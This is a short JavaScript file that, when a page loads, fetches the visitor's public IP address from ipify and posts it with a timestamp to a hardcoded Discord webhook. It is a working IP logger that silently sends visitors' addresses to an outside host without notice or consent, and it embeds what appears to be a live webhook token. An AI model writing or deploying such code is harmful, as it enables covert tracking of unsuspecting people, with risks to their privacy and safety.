// Discord webhook URL - Replace with your actual webhook URL
const discordWebhookUrl = 'https://discord.com/api/webhooks/1306285452394889226/N79NNR4O9o-_JAO133sHZ1ltgs-JAXgIGGMv6ucBlA-JhyTPzL4JkDSd7VZciPhHerdC'; // Replace with your Discord webhook URL

// Fetch the client's public IP address using the ipify API
async function fetchIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        if (!response.ok) {
            throw new Error('Failed to fetch IP address');
        }

        const data = await response.json();
        const userIp = data.ip;
        console.log('IP address:', userIp);

        // Send the IP address to the Discord webhook with timestamp
        await sendToDiscord(userIp);
    } catch (error) {
        console.error('Error fetching IP address:', error);
    }
}

// Send the IP address to Discord using the webhook
async function sendToDiscord(ip) {
    try {
        // Get current timestamp
        const timestamp = new Date().toISOString();

        // Create the payload with the timestamp included
        const payload = {
            content: `Logged IP address: ${ip} at ${timestamp}`, // The message sent to the Discord channel
        };

        const response = await fetch(discordWebhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        });

        if (!response.ok) {
            throw new Error('Failed to send message to Discord');
        }

        console.log('Successfully sent to Discord:', ip);
    } catch (error) {
        console.error('Error sending to Discord:', error);
    }
}

// Call the fetchIP function when the page loads
fetchIP();
